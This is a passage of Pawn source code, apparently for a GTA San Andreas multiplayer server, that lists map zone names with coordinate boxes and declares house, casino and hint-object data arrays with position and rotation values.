	{"Julius Thruway North",        {1938.80,2508.20,-89.00,2121.40,2624.20,110.90}},
	{"Julius Thruway North",        {1534.50,2433.20,-89.00,1848.40,2583.20,110.90}},
	{"Julius Thruway North",        {1848.40,2478.40,-89.00,1938.80,2553.40,110.90}},
	{"Julius Thruway North",        {1704.50,2342.80,-89.00,1848.40,2433.20,110.90}},
	{"Julius Thruway North",        {1377.30,2433.20,-89.00,1534.50,2507.20,110.90}},
	{"Julius Thruway South",        {1457.30,823.20,-89.00,2377.30,863.20,110.90}},
	{"Julius Thruway South",        {2377.30,788.80,-89.00,2537.30,897.90,110.90}},
	{"Julius Thruway West",         {1197.30,1163.30,-89.00,1236.60,2243.20,110.90}},
	{"Julius Thruway West",         {1236.60,2142.80,-89.00,1297.40,2243.20,110.90}},
	{"Juniper Hill",                {-2533.00,578.30,-7.60,-2274.10,968.30,200.00}},
	{"Juniper Hollow",              {-2533.00,968.30,-6.10,-2274.10,1358.90,200.00}},
	{"K.A.C.C. Military Fuels",     {2498.20,2626.50,-89.00,2749.90,2861.50,110.90}},
	{"Kincaid Bridge",              {-1339.80,599.20,-89.00,-1213.90,828.10,110.90}},
	{"Kincaid Bridge",              {-1213.90,721.10,-89.00,-1087.90,950.00,110.90}},
	{"Kincaid Bridge",              {-1087.90,855.30,-89.00,-961.90,986.20,110.90}},
	{"King's",                      {-2329.30,458.40,-7.60,-1993.20,578.30,200.00}},
	{"King's",                      {-2411.20,265.20,-9.10,-1993.20,373.50,200.00}},
	{"King's",                      {-2253.50,373.50,-9.10,-1993.20,458.40,200.00}},
	{"LVA Freight Depot",           {1457.30,863.20,-89.00,1777.40,1143.20,110.90}},
	{"LVA Freight Depot",           {1375.60,919.40,-89.00,1457.30,1203.20,110.90}},
	{"LVA Freight Depot",           {1277.00,1087.60,-89.00,1375.60,1203.20,110.90}},
	{"LVA Freight Depot",           {1315.30,1044.60,-89.00,1375.60,1087.60,110.90}},
	{"LVA Freight Depot",           {1236.60,1163.40,-89.00,1277.00,1203.20,110.90}},
	{"Las Barrancas",               {-926.10,1398.70,-3.00,-719.20,1634.60,200.00}},
	{"Las Brujas",                  {-365.10,2123.00,-3.00,-208.50,2217.60,200.00}},
	{"Las Colinas",                 {1994.30,-1100.80,-89.00,2056.80,-920.80,110.90}},
	{"Las Colinas",                 {2056.80,-1126.30,-89.00,2126.80,-920.80,110.90}},
	{"Las Colinas",                 {2185.30,-1154.50,-89.00,2281.40,-934.40,110.90}},
	{"Las Colinas",                 {2126.80,-1126.30,-89.00,2185.30,-934.40,110.90}},
	{"Las Colinas",                 {2747.70,-1120.00,-89.00,2959.30,-945.00,110.90}},
	{"Las Colinas",                 {2632.70,-1135.00,-89.00,2747.70,-945.00,110.90}},
	{"Las Colinas",                 {2281.40,-1135.00,-89.00,2632.70,-945.00,110.90}},
	{"Las Payasadas",               {-354.30,2580.30,2.00,-133.60,2816.80,200.00}},
	{"Las Venturas Airport",        {1236.60,1203.20,-89.00,1457.30,1883.10,110.90}},
	{"Las Venturas Airport",        {1457.30,1203.20,-89.00,1777.30,1883.10,110.90}},
	{"Las Venturas Airport",        {1457.30,1143.20,-89.00,1777.40,1203.20,110.90}},
	{"Las Venturas Airport",        {1515.80,1586.40,-12.50,1729.90,1714.50,87.50}},
	{"Last Dime Motel",             {1823.00,596.30,-89.00,1997.20,823.20,110.90}},
	{"Leafy Hollow",                {-1166.90,-1856.00,0.00,-815.60,-1602.00,200.00}},
	{"Liberty City",                {-1000.00,400.00,1300.00,-700.00,600.00,1400.00}},
	{"Lil' Probe Inn",              {-90.20,1286.80,-3.00,153.80,1554.10,200.00}},
	{"Linden Side",                 {2749.90,943.20,-89.00,2923.30,1198.90,110.90}},
	{"Linden Station",              {2749.90,1198.90,-89.00,2923.30,1548.90,110.90}},
	{"Linden Station",              {2811.20,1229.50,-39.50,2861.20,1407.50,60.40}},
	{"Little Mexico",               {1701.90,-1842.20,-89.00,1812.60,-1722.20,110.90}},
	{"Little Mexico",               {1758.90,-1722.20,-89.00,1812.60,-1577.50,110.90}},
	{"Los Flores",                  {2581.70,-1454.30,-89.00,2632.80,-1393.40,110.90}},
	{"Los Flores",                  {2581.70,-1393.40,-89.00,2747.70,-1135.00,110.90}},
	{"Los Santos International",    {1249.60,-2394.30,-89.00,1852.00,-2179.20,110.90}},
	{"Los Santos International",    {1852.00,-2394.30,-89.00,2089.00,-2179.20,110.90}},
	{"Los Santos International",    {1382.70,-2730.80,-89.00,2201.80,-2394.30,110.90}},
	{"Los Santos International",    {1974.60,-2394.30,-39.00,2089.00,-2256.50,60.90}},
	{"Los Santos International",    {1400.90,-2669.20,-39.00,2189.80,-2597.20,60.90}},
	{"Los Santos International",    {2051.60,-2597.20,-39.00,2152.40,-2394.30,60.90}},
	{"Marina",                      {647.70,-1804.20,-89.00,851.40,-1577.50,110.90}},
	{"Marina",                      {647.70,-1577.50,-89.00,807.90,-1416.20,110.90}},
	{"Marina",                      {807.90,-1577.50,-89.00,926.90,-1416.20,110.90}},
	{"Market",                      {787.40,-1416.20,-89.00,1072.60,-1310.20,110.90}},
	{"Market",                      {952.60,-1310.20,-89.00,1072.60,-1130.80,110.90}},
	{"Market",                      {1072.60,-1416.20,-89.00,1370.80,-1130.80,110.90}},
	{"Market",                      {926.90,-1577.50,-89.00,1370.80,-1416.20,110.90}},
	{"Market Station",              {787.40,-1410.90,-34.10,866.00,-1310.20,65.80}},
	{"Martin Bridge",               {-222.10,293.30,0.00,-122.10,476.40,200.00}},
	{"Missionary Hill",             {-2994.40,-811.20,0.00,-2178.60,-430.20,200.00}},
	{"Montgomery",                  {1119.50,119.50,-3.00,1451.40,493.30,200.00}},
	{"Montgomery",                  {1451.40,347.40,-6.10,1582.40,420.80,200.00}},
	{"Montgomery Intersection",     {1546.60,208.10,0.00,1745.80,347.40,200.00}},
	{"Montgomery Intersection",     {1582.40,347.40,0.00,1664.60,401.70,200.00}},
	{"Mulholland",                  {1414.00,-768.00,-89.00,1667.60,-452.40,110.90}},
	{"Mulholland",                  {1281.10,-452.40,-89.00,1641.10,-290.90,110.90}},
	{"Mulholland",                  {1269.10,-768.00,-89.00,1414.00,-452.40,110.90}},
	{"Mulholland",                  {1357.00,-926.90,-89.00,1463.90,-768.00,110.90}},
	{"Mulholland",                  {1318.10,-910.10,-89.00,1357.00,-768.00,110.90}},
	{"Mulholland",                  {1169.10,-910.10,-89.00,1318.10,-768.00,110.90}},
	{"Mulholland",                  {768.60,-954.60,-89.00,952.60,-860.60,110.90}},
	{"Mulholland",                  {687.80,-860.60,-89.00,911.80,-768.00,110.90}},
	{"Mulholland",                  {737.50,-768.00,-89.00,1142.20,-674.80,110.90}},
	{"Mulholland",                  {1096.40,-910.10,-89.00,1169.10,-768.00,110.90}},
	{"Mulholland",                  {952.60,-937.10,-89.00,1096.40,-860.60,110.90}},
	{"Mulholland",                  {911.80,-860.60,-89.00,1096.40,-768.00,110.90}},
	{"Mulholland",                  {861.00,-674.80,-89.00,1156.50,-600.80,110.90}},
	{"Mulholland Intersection",     {1463.90,-1150.80,-89.00,1812.60,-768.00,110.90}},
	{"North Rock",                  {2285.30,-768.00,0.00,2770.50,-269.70,200.00}},
	{"Ocean Docks",                 {2373.70,-2697.00,-89.00,2809.20,-2330.40,110.90}},
	{"Ocean Docks",                 {2201.80,-2418.30,-89.00,2324.00,-2095.00,110.90}},
	{"Ocean Docks",                 {2324.00,-2302.30,-89.00,2703.50,-2145.10,110.90}},
	{"Ocean Docks",                 {2089.00,-2394.30,-89.00,2201.80,-2235.80,110.90}},
	{"Ocean Docks",                 {2201.80,-2730.80,-89.00,2324.00,-2418.30,110.90}},
	{"Ocean Docks",                 {2703.50,-2302.30,-89.00,2959.30,-2126.90,110.90}},
	{"Ocean Docks",                 {2324.00,-2145.10,-89.00,2703.50,-2059.20,110.90}},
	{"Ocean Flats",                 {-2994.40,277.40,-9.10,-2867.80,458.40,200.00}},
	{"Ocean Flats",                 {-2994.40,-222.50,-0.00,-2593.40,277.40,200.00}},
	{"Ocean Flats",                 {-2994.40,-430.20,-0.00,-2831.80,-222.50,200.00}},
	{"Octane Springs",              {338.60,1228.50,0.00,664.30,1655.00,200.00}},
	{"Old Venturas Strip",          {2162.30,2012.10,-89.00,2685.10,2202.70,110.90}},
	{"Palisades",                   {-2994.40,458.40,-6.10,-2741.00,1339.60,200.00}},
	{"Palomino Creek",              {2160.20,-149.00,0.00,2576.90,228.30,200.00}},
	{"Paradiso",                    {-2741.00,793.40,-6.10,-2533.00,1268.40,200.00}},
	{"Pershing Square",             {1440.90,-1722.20,-89.00,1583.50,-1577.50,110.90}},
	{"Pilgrim",                     {2437.30,1383.20,-89.00,2624.40,1783.20,110.90}},
	{"Pilgrim",                     {2624.40,1383.20,-89.00,2685.10,1783.20,110.90}},
	{"Pilson Intersection",         {1098.30,2243.20,-89.00,1377.30,2507.20,110.90}},
	{"Pirates in Men's Pants",      {1817.30,1469.20,-89.00,2027.40,1703.20,110.90}},
	{"Playa del Seville",           {2703.50,-2126.90,-89.00,2959.30,-1852.80,110.90}},
	{"Prickle Pine",                {1534.50,2583.20,-89.00,1848.40,2863.20,110.90}},
	{"Prickle Pine",                {1117.40,2507.20,-89.00,1534.50,2723.20,110.90}},
	{"Prickle Pine",                {1848.40,2553.40,-89.00,1938.80,2863.20,110.90}},
	{"Prickle Pine",                {1938.80,2624.20,-89.00,2121.40,2861.50,110.90}},
	{"Queens",                      {-2533.00,458.40,0.00,-2329.30,578.30,200.00}},
	{"Queens",                      {-2593.40,54.70,0.00,-2411.20,458.40,200.00}},
	{"Queens",                      {-2411.20,373.50,0.00,-2253.50,458.40,200.00}},
	{"Randolph Industrial Estate",  {1558.00,596.30,-89.00,1823.00,823.20,110.90}},
	{"Redsands East",               {1817.30,2011.80,-89.00,2106.70,2202.70,110.90}},
	{"Redsands East",               {1817.30,2202.70,-89.00,2011.90,2342.80,110.90}},
	{"Redsands East",               {1848.40,2342.80,-89.00,2011.90,2478.40,110.90}},
	{"Redsands West",               {1236.60,1883.10,-89.00,1777.30,2142.80,110.90}},
	{"Redsands West",               {1297.40,2142.80,-89.00,1777.30,2243.20,110.90}},
	{"Redsands West",               {1377.30,2243.20,-89.00,1704.50,2433.20,110.90}},
	{"Redsands West",               {1704.50,2243.20,-89.00,1777.30,2342.80,110.90}},
	{"Regular Tom",                 {-405.70,1712.80,-3.00,-276.70,1892.70,200.00}},
	{"Richman",                     {647.50,-1118.20,-89.00,787.40,-954.60,110.90}},
	{"Richman",                     {647.50,-954.60,-89.00,768.60,-860.60,110.90}},
	{"Richman",                     {225.10,-1369.60,-89.00,334.50,-1292.00,110.90}},
	{"Richman",                     {225.10,-1292.00,-89.00,466.20,-1235.00,110.90}},
	{"Richman",                     {72.60,-1404.90,-89.00,225.10,-1235.00,110.90}},
	{"Richman",                     {72.60,-1235.00,-89.00,321.30,-1008.10,110.90}},
	{"Richman",                     {321.30,-1235.00,-89.00,647.50,-1044.00,110.90}},
	{"Richman",                     {321.30,-1044.00,-89.00,647.50,-860.60,110.90}},
	{"Richman",                     {321.30,-860.60,-89.00,687.80,-768.00,110.90}},
	{"Richman",                     {321.30,-768.00,-89.00,700.70,-674.80,110.90}},
	{"Robada Intersection",         {-1119.00,1178.90,-89.00,-862.00,1351.40,110.90}},
	{"Roca Escalante",              {2237.40,2202.70,-89.00,2536.40,2542.50,110.90}},
	{"Roca Escalante",              {2536.40,2202.70,-89.00,2625.10,2442.50,110.90}},
	{"Rockshore East",              {2537.30,676.50,-89.00,2902.30,943.20,110.90}},
	{"Rockshore West",              {1997.20,596.30,-89.00,2377.30,823.20,110.90}},
	{"Rockshore West",              {2377.30,596.30,-89.00,2537.30,788.80,110.90}},
	{"Rodeo",                       {72.60,-1684.60,-89.00,225.10,-1544.10,110.90}},
	{"Rodeo",                       {72.60,-1544.10,-89.00,225.10,-1404.90,110.90}},
	{"Rodeo",                       {225.10,-1684.60,-89.00,312.80,-1501.90,110.90}},
	{"Rodeo",                       {225.10,-1501.90,-89.00,334.50,-1369.60,110.90}},
	{"Rodeo",                       {334.50,-1501.90,-89.00,422.60,-1406.00,110.90}},
	{"Rodeo",                       {312.80,-1684.60,-89.00,422.60,-1501.90,110.90}},
	{"Rodeo",                       {422.60,-1684.60,-89.00,558.00,-1570.20,110.90}},
	{"Rodeo",                       {558.00,-1684.60,-89.00,647.50,-1384.90,110.90}},
	{"Rodeo",                       {466.20,-1570.20,-89.00,558.00,-1385.00,110.90}},
	{"Rodeo",                       {422.60,-1570.20,-89.00,466.20,-1406.00,110.90}},
	{"Rodeo",                       {466.20,-1385.00,-89.00,647.50,-1235.00,110.90}},
	{"Rodeo",                       {334.50,-1406.00,-89.00,466.20,-1292.00,110.90}},
	{"Royal Casino",                {2087.30,1383.20,-89.00,2437.30,1543.20,110.90}},
	{"San Andreas Sound",           {2450.30,385.50,-100.00,2759.20,562.30,200.00}},
	{"Santa Flora",                 {-2741.00,458.40,-7.60,-2533.00,793.40,200.00}},
	{"Santa Maria Beach",           {342.60,-2173.20,-89.00,647.70,-1684.60,110.90}},
	{"Santa Maria Beach",           {72.60,-2173.20,-89.00,342.60,-1684.60,110.90}},
	{"Shady Cabin",                 {-1632.80,-2263.40,-3.00,-1601.30,-2231.70,200.00}},
	{"Shady Creeks",                {-1820.60,-2643.60,-8.00,-1226.70,-1771.60,200.00}},
	{"Shady Creeks",                {-2030.10,-2174.80,-6.10,-1820.60,-1771.60,200.00}},
	{"Sobell Rail Yards",           {2749.90,1548.90,-89.00,2923.30,1937.20,110.90}},
	{"Spinybed",                    {2121.40,2663.10,-89.00,2498.20,2861.50,110.90}},
	{"Starfish Casino",             {2437.30,1783.20,-89.00,2685.10,2012.10,110.90}},
	{"Starfish Casino",             {2437.30,1858.10,-39.00,2495.00,1970.80,60.90}},
	{"Starfish Casino",             {2162.30,1883.20,-89.00,2437.30,2012.10,110.90}},
	{"Temple",                      {1252.30,-1130.80,-89.00,1378.30,-1026.30,110.90}},
	{"Temple",                      {1252.30,-1026.30,-89.00,1391.00,-926.90,110.90}},
	{"Temple",                      {1252.30,-926.90,-89.00,1357.00,-910.10,110.90}},
	{"Temple",                      {952.60,-1130.80,-89.00,1096.40,-937.10,110.90}},
	{"Temple",                      {1096.40,-1130.80,-89.00,1252.30,-1026.30,110.90}},
	{"Temple",                      {1096.40,-1026.30,-89.00,1252.30,-910.10,110.90}},
	{"The Camel's Toe",             {2087.30,1203.20,-89.00,2640.40,1383.20,110.90}},
	{"The Clown's Pocket",          {2162.30,1783.20,-89.00,2437.30,1883.20,110.90}},
	{"The Emerald Isle",            {2011.90,2202.70,-89.00,2237.40,2508.20,110.90}},
	{"The Farm",                    {-1209.60,-1317.10,114.90,-908.10,-787.30,251.90}},
	{"The Four Dragons Casino",     {1817.30,863.20,-89.00,2027.30,1083.20,110.90}},
	{"The High Roller",             {1817.30,1283.20,-89.00,2027.30,1469.20,110.90}},
	{"The Mako Span",               {1664.60,401.70,0.00,1785.10,567.20,200.00}},
	{"The Panopticon",              {-947.90,-304.30,-1.10,-319.60,327.00,200.00}},
	{"The Pink Swan",               {1817.30,1083.20,-89.00,2027.30,1283.20,110.90}},
	{"The Sherman Dam",             {-968.70,1929.40,-3.00,-481.10,2155.20,200.00}},
	{"The Strip",                   {2027.40,863.20,-89.00,2087.30,1703.20,110.90}},
	{"The Strip",                   {2106.70,1863.20,-89.00,2162.30,2202.70,110.90}},
	{"The Strip",                   {2027.40,1783.20,-89.00,2162.30,1863.20,110.90}},
	{"The Strip",                   {2027.40,1703.20,-89.00,2137.40,1783.20,110.90}},
	{"The Visage",                  {1817.30,1863.20,-89.00,2106.70,2011.80,110.90}},
	{"The Visage",                  {1817.30,1703.20,-89.00,2027.40,1863.20,110.90}},
	{"Unity Station",               {1692.60,-1971.80,-20.40,1812.60,-1932.80,79.50}},
	{"Valle Ocultado",              {-936.60,2611.40,2.00,-715.90,2847.90,200.00}},
	{"Verdant Bluffs",              {930.20,-2488.40,-89.00,1249.60,-2006.70,110.90}},
	{"Verdant Bluffs",              {1073.20,-2006.70,-89.00,1249.60,-1842.20,110.90}},
	{"Verdant Bluffs",              {1249.60,-2179.20,-89.00,1692.60,-1842.20,110.90}},
	{"Verdant Meadows",             {37.00,2337.10,-3.00,435.90,2677.90,200.00}},
	{"Verona Beach",                {647.70,-2173.20,-89.00,930.20,-1804.20,110.90}},
	{"Verona Beach",                {930.20,-2006.70,-89.00,1073.20,-1804.20,110.90}},
	{"Verona Beach",                {851.40,-1804.20,-89.00,1046.10,-1577.50,110.90}},
	{"Verona Beach",                {1161.50,-1722.20,-89.00,1323.90,-1577.50,110.90}},
	{"Verona Beach",                {1046.10,-1722.20,-89.00,1161.50,-1577.50,110.90}},
	{"Vinewood",                    {787.40,-1310.20,-89.00,952.60,-1130.80,110.90}},
	{"Vinewood",                    {787.40,-1130.80,-89.00,952.60,-954.60,110.90}},
	{"Vinewood",                    {647.50,-1227.20,-89.00,787.40,-1118.20,110.90}},
	{"Vinewood",                    {647.70,-1416.20,-89.00,787.40,-1227.20,110.90}},
	{"Whitewood Estates",           {883.30,1726.20,-89.00,1098.30,2507.20,110.90}},
	{"Whitewood Estates",           {1098.30,1726.20,-89.00,1197.30,2243.20,110.90}},
	{"Willowfield",                 {1970.60,-2179.20,-89.00,2089.00,-1852.80,110.90}},
	{"Willowfield",                 {2089.00,-2235.80,-89.00,2201.80,-1989.90,110.90}},
	{"Willowfield",                 {2089.00,-1989.90,-89.00,2324.00,-1852.80,110.90}},
	{"Willowfield",                 {2201.80,-2095.00,-89.00,2324.00,-1989.90,110.90}},
	{"Willowfield",                 {2541.70,-1941.40,-89.00,2703.50,-1852.80,110.90}},
	{"Willowfield",                 {2324.00,-2059.20,-89.00,2541.70,-1852.80,110.90}},
	{"Willowfield",                 {2541.70,-2059.20,-89.00,2703.50,-1941.40,110.90}},
	{"Yellow Bell Station",         {1377.40,2600.40,-21.90,1492.40,2687.30,78.00}},
	{"Los Santos",                  {44.60,-2892.90,-242.90,2997.00,-768.00,900.00}},
	{"Las Venturas",                {869.40,596.30,-242.90,2997.00,2993.80,900.00}},
	{"Bone County",                 {-480.50,596.30,-242.90,869.40,2993.80,900.00}},
	{"Tierra Robada",               {-2997.40,1659.60,-242.90,-480.50,2993.80,900.00}},
	{"Tierra Robada",               {-1213.90,596.30,-242.90,-480.50,1659.60,900.00}},
	{"San Fierro",                  {-2997.40,-1115.50,-242.90,-1213.90,1659.60,900.00}},
	{"Red County",                  {-1213.90,-768.00,-242.90,2997.00,596.30,900.00}},
	{"Flint County",                {-1213.90,-2892.90,-242.90,44.60,-768.00,900.00}},
	{"Whetstone",                   {-2997.40,-2892.90,-242.90,-1213.90,-1115.50,900.00}}
};

//Дома
new gCasino[2][CASINO_DATA];
new gCreatehouse[MAX_PLAYERS][CREATE_HOUSE_DATA];
new gHouses[MAX_HOUSE_COUNT][HOUSE_DATA];
new gHouseHabits[MAX_HOUSE_COUNT][3][MAX_PLAYER_NAME];
new gHints[HINTS_COUNT][HINT_DATA];
new gHouseArea[MAX_HOUSE_COUNT];
new gHousePickup[MAX_HOUSE_COUNT];
new gHouseIcon[MAX_HOUSE_COUNT];
new gHouseCount;
new Float:gHintStore[HINTS_COUNT][6] = {
	{2230.9829,-1109.4178,1049.8623,0.0000,0.0000,180.0},
	{2185.5993,-1215.0634,1048.0128,0.0000,0.0000,0.0000},
	{2321.5439,-1007.9141,1053.7084,0.0000,0.0000,-90.0},
	{2268.2766,-1137.1439,1049.5922,0.0000,0.0000,-180.0},
	{2362.9790,-1133.6341,1049.8741,0.0000,0.0000,-90.0},
	{2281.3879,-1140.3836,1049.8778,0.0000,0.0000,180.0},
	{2214.6550,-1078.5512,1049.4733,0.0000,0.0000,180.0},
	{93.9579,1332.4388,1087.3562,0.0000,0.0000,-180.0},
	{232.0812,1078.6463,1086.7938,0.0000,0.0000,-180.0},
	{247.1169,306.4585,998.1483,0.0000,0.0000,0.0},//10
	{267.0915,307.1669,998.0889,0.0000,0.0000,42.3000},
	{2456.5756,-1705.1350,1012.4469,0.0000,0.0000,-90.0},
	{2490.8063,-1705.2812,1017.2929,0.0000,0.0000,90.0},
	{2259.0554,-1218.4326,1047.9423,0.0000,0.0000,180.0},
	{239.8603,1108.8549,1079.9216,0.0000,0.0000,-180.0},
	{236.2240,1186.8347,1083.3648,0.0000,0.0000,-180.0},
	{223.7360,1247.5538,1081.0595,0.0000,0.0000,0.0000},
	{230.5292,1291.7623,1081.1096,0.0000,0.0000,0.0000},
	{36.2862,1343.1430,1087.7739,0.0000,0.0000,-90.0},
	{289.1342,1473.9226,1079.1767,0.0000,0.0000,90.0},//20
	{2335.0346,-1142.2761,1053.3045,0.0000,0.0000,90.0},
	{-275.6218,1458.4542,1087.8499,0.0000,0.0000,0.0},
	{330.9278,1491.6746,1083.4166,0.0000,0.0000,0.0},
	{15.1880,1410.3474,1083.4199,0.0000,0.0000,90.0},
	{378.1139,1469.3828,1079.1645,0.0000,0.0000,0.0},
	{359.2552,1418.3598,1080.3144,0.0000,0.0000,0.0},
	{441.5642,1405.0961,1083.2796,0.0000,0.0000,0.0},
	{138.5746,1387.2512,1087.3559,0.0000,0.0000,0.0},
	{494.9393,1418.8679,1083.3260,0.0000,0.0000,-90.0},//29
	{232.0812,1078.6463,1086.7938,0.0000,0.0000,-180.0}, //30Взят с 9
	{255.3610,1285.5831,1079.1768,0.0000,0.0000,-180.0}, //31
	{-72.3775,1365.5113,1079.1300,0.0000,0.0000,91.4000},
	{2819.7868,-1168.0839,1028.0808,0.0000,0.0000,-89.4000},
	{2214.6550,-1078.5512,1049.4733,0.0000,0.0000,180.0},
	{2245.5871,-1076.5100,1047.9423,0.0000,0.0000,-89.1999},//35
	{2362.9790,-1133.6341,1049.8741,0.0000,0.0000,-90.0},
	{-43.2747,1412.8441,1083.3686,0.0000,0.0000,0.0000},//37
	{93.9579,1332.4388,1087.3562,0.0000,0.0000,-180.0},
	{256.2465,1243.9345,1083.1567,0.0000,0.0000,90.3999},
	{247.1169,306.4585,998.1483,0.0000,0.0000,0.0},//40
	{418.3812,2534.8603,8.9199,0.0000,0.0000,177.9998},
	{223.7360,1247.5538,1081.0595,0.0000,0.0000,0.0000}

};
new Float:gHintGun[HINTS_COUNT][9][6] = {
	{//1
		{2230.5559,-1109.2418,1050.3012,83.6000,-118.3999,117.3999},
		{2229.4748,-1109.2708,1049.9582,83.2000,-89.3999,96.6999},
		{2230.0166,-1109.1765,1050.8988,-81.9998,61.3000,-96.7000},
		{2229.3176,-1109.1652,1051.1601,6.5000,-82.5000,-97.9999},
		{2229.2880,-1109.5543,1050.9100,12.1999,-71.2999,-87.9999},
		{2229.4479,-1109.5286,1050.3303,56.9999,7.5999,18.6000},
		{2230.2072,-1109.4383,1050.8728,89.8999,26.2999,-4.2000},
		{2230.7626,-1109.1232,1050.8629,94.8999,-40.3000,1.0000},
		{2229.9206,-1109.2763,1050.2739,-2.0999,-89.5000,9.0999}
	},
	{//2
		{2186.0261,-1215.1459,1048.1180,83.0000,-84.8999,-58.1999},
		{2187.0422,-1215.2155,1048.1230,85.7998,-85.6999,-80.0999},
		{2186.1198,-1215.2502,1049.0441,-77.2000,26.0999,29.7000},
		{2187.1918,-1215.0808,1049.2905,-19.6999,-87.3000,-94.0999},
		{2185.4855,-1215.0156,1049.0272,83.6999,-96.4000,40.3001},
		{2186.9467,-1215.3616,1048.4693,85.0000,-76.5999,-113.8000},
		{2185.6242,-1215.1845,1048.4630,90.1000,161.0999,0.0000},
		{2185.9206,-1215.1263,1048.4523,87.8000,-18.2000,2.0999},
		{2187.1906,-1215.3975,1049.2072,0.0000,11.1999,0.0000}
	},
	{//3
		{2321.5947,-1008.7932,1053.8161,82.7000,-82.2000,0.0000},
		{2321.1960,-1008.8005,1053.8085,83.8000,-82.7999,177.1000},
		{2321.2919,-1008.4655,1054.7375,85.1999,-15.3000,88.0000},
		{2321.4140,-1007.6964,1054.9479,-14.7999,-87.8999,0.0000},
		{2321.3486,-1009.3344,1054.6926,97.8000,70.8000,7.6999},
		{2321.2492,-1009.1431,1054.2075,84.3998,-81.3999,160.8999},
		{2321.3256,-1007.9334,1054.1973,92.9999,60.9000,0.0000},
		{2321.4428,-1008.1199,1054.1818,90.1998,-91.7999,0.0000},
		{2321.5231,-1009.5777,1054.9100,10.0999,0.0000,0.0000}
	},
	{//4
		{2268.6020,-1136.8701,1050.8730,0.0000,-84.2999,93.4000},
		{2267.2458,-1136.8748,1049.6923,83.3000,-79.5000,74.9999},
		{2266.5495,-1137.2025,1050.8144,4.7000,-86.1999,-100.5000},
		{2267.8305,-1136.8919,1050.6141,84.5999,-20.7000,12.7000},
		{2266.9887,-1136.8721,1050.5859,84.9999,-85.0999,74.9000},
		{2267.3652,-1137.0745,1050.0953,-94.8999,-81.1000,69.7999},
		{2268.5744,-1137.1590,1050.0795,-90.3000,-92.2000,79.8000},
		{2268.0302,-1136.9085,1050.0773,-85.9999,-84.4999,147.6000},
		{2266.7045,-1136.8273,1050.7457,17.6999,0.0000,-86.4999}
	},
	{
		{2363.0830,-1135.2955,1051.1525,7.2000,-89.3999,5.9999},
		{2362.8430,-1133.5778,1050.2916,80.7000,-91.4999,4.0999},
		{2363.0356,-1134.7260,1050.3225,84.7001,-91.7999,-15.2999},
		{2362.9033,-1133.5949,1050.8293,83.8000,-93.8000,0.0000},
		{2362.9553,-1134.6196,1050.8431,84.4999,-80.2999,11.3000},
		{2362.8706,-1134.0915,1050.0480,-95.4999,-88.6999,0.0000},
		{2362.8764,-1135.3797,1050.0174,-85.7000,-103.9999,5.2999},
		{2362.9414,-1134.5920,1049.9790,91.7000,-90.0999,0.0000},
		{2362.9582,-1133.7320,1050.3035,86.8999,0.0000,0.0000}
	},
	{
		{2281.6120,-1140.3304,1051.1688,-14.3999,-82.3999,-99.9999},
		{2280.4050,-1140.3299,1050.8349,83.8000,-94.0999,-85.6999},
		{2281.5002,-1140.4453,1050.3421,92.3999,96.7000,59.7999},
		{2279.9296,-1140.1995,1050.3269,82.3999,-15.9999,0.0000},
		{2281.0766,-1140.0678,1050.8569,81.0999,-34.0000,0.0000},
		{2280.4497,-1140.3245,1050.0104,101.4000,168.8000,4.9000},
		{2280.6052,-1140.3764,1050.0167,-83.8999,-95.7999,-29.9999},
		{2281.1916,-1140.3295,1050.0291,-83.4999,-99.0999,-46.0999},
		{2279.7604,-1140.4005,1051.0657,-17.7999,0.4999,76.6000}
	},
	{
		{2213.0502,-1078.5592,1050.7282,9.3000,-83.3999,-85.9000},
		{2213.2331,-1078.2573,1049.6422,82.6000,15.1000,0.0000},
		{2213.4951,-1078.4422,1050.5198,-91.7000,-2.8999,0.0000},
		{2214.5710,-1078.2583,1049.9890,-96.4999,-88.3000,108.1000},
		{2213.1699,-1078.2252,1049.9061,81.4999,-90.7999,0.0000},
		{2214.4401,-1078.2912,1049.6586,-96.1999,-91.0000,93.8000},
		{2214.5205,-1078.3054,1050.4462,85.6000,-96.8000,0.0000},
		{2213.6228,-1078.3291,1049.9040,92.6000,-86.2000,0.0000},
		{2214.7204,-1078.5628,1050.6632,-2.5000,10.3999,-3.3999}
	},
	{
		{92.3099,1332.3265,1088.5828,9.6000,-74.8000,-86.9999},
		{92.9487,1332.3618,1087.4586,83.4000,-88.6999,-102.7000},
		{92.9229,1332.4888,1087.8265,85.0000,-85.9000,-108.1999},
		{93.5603,1332.4053,1087.8052,86.8000,-90.8000,102.7000},
		{92.7731,1332.5959,1088.3270,81.7000,-87.2999,70.5000},
		{93.5145,1332.4875,1087.4589,83.4000,-85.3000,123.5999},
		{93.4993,1332.5137,1087.7939,88.4000,-102.8999,-106.3999},
		{93.2148,1332.5363,1087.4704,96.5000,-87.9000,-121.6999},
		{93.9607,1332.6926,1088.3223,83.5999,-62.7000,-4.2999}
	},
	{
		{230.4967,1078.5915,1088.0456,14.4000,-81.0999,-85.6999},
		{232.2165,1078.7932,1087.3403,-99.5999,-83.7997,97.1000},
		{230.6073,1078.7187,1087.2849,-94.1999,-90.1999,-80.9999},
		{231.0201,1078.7014,1087.7584,84.4999,-49.5000,57.4000},
		{232.3048,1078.9715,1086.9033,74.8999,-97.5999,0.0000},
		{230.5998,1078.8149,1086.9871,-108.1000,-10.4000,0.0000},
		{232.0678,1078.7966,1087.7777,85.5000,-95.3000,61.7999},
		{231.8922,1078.7626,1086.9039,87.2000,-95.2999,-49.7999},
		{231.0660,1078.5925,1086.8918,85.1000,0.0000,113.1999}
	},
	{//10
		{247.5639,306.4898,999.1984,-83.1999,168.1999,0.0000},
		{248.1473,306.3545,998.5646,79.9000,-20.6000,24.3999},
		{247.5267,306.2283,998.6350,86.6000,-80.6000,-116.1000},
		{248.7151,306.4465,999.4209,12.2000,-90.3000,92.8000},
		{248.4544,306.3364,999.1611,-97.0999,-128.8999,0.0000},
		{247.1092,306.3216,998.3325,-80.0999,39.5999,0.0000},
		{248.1372,306.1315,998.3295,-96.0000,-94.7000,0.0000},
		{248.6265,306.4161,998.2476,86.0000,-95.3999,0.0000},
		{246.8255,306.5256,999.3200,0.0000,-12.3999,-0.9000}
	},
	{//11
		{268.3220,307.9188,999.0593,84.0999,-83.1000,-47.5999},
		{268.1723,308.1833,999.0474,82.6000,-81.0999,-45.5000},
		{268.2259,308.1613,998.5336,84.7000,-87.2999,-49.3999},
		{267.0678,306.8350,999.3276,7.7999,-87.8999,-46.7999},
		{267.3970,307.2912,999.0565,83.4999,-81.8000,-58.9000},
		{267.5220,307.3995,998.5214,84.4000,-82.2999,-52.5000},
		{268.4016,308.1021,998.2188,88.4999,-90.4000,-52.0999},
